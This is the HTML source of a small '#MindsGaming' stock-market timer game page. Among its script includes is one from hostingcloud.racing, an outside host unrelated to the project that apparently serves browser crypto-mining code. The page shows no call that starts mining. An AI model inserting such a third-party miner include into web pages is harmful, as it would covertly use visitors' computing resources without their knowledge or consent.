<!DOCTYPE html>
<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
    <script src="https://mindsgaming.glitch.me/mtcg/invest.js"></script>
    <script src="https://mindsgaming.glitch.me/mtcg/deck/playdeck.js"></script>
    <script src="https://mindsgaming.glitch.me/script.js"></script>

    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <!-- import the webpage's stylesheet -->
    <link rel="stylesheet" href="https://ipack.glitch.me/mgicons.css" defer />
    <link rel="stylesheet" href="https://mindsgaming.glitch.me/cpu.css" defer />
    <link
      rel="stylesheet"
      href="https://mindsgaming.glitch.me/mtcg/style.css"
      defer
    />
    <script src="/games/stocks/stocks.js" defer></script>

    <link rel="stylesheet" href="/fly.css" />
    <script src="/js/mice.js" defer></script>

    <style>
      .market {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border-style: groove;
        border-color: black;
        background-color: silver;
        padding: 2px;
      }
      .stocks {
        float: left;
        margin-left: 5%;
      }
    </style>
  </head>

  <body>
    <center>
      <div class="market">
        <h3>
          Market Timer <br />
          <label id="minutes" value="0">00</label>:<label id="seconds" value="0"
            >00</label
          >
        </h3>
        <div class="stocks">
          <div class="stock">
            <h4>
              StockOne
            </h4>
            <p>
              Something About Stock
            </p>
            <label id="stockOne" value="0">00</label>.<label id="stockOnes" value="0"
            >00</label
          >
          </div>
        </div>
      </div>
    </center>
  </body>
</html>
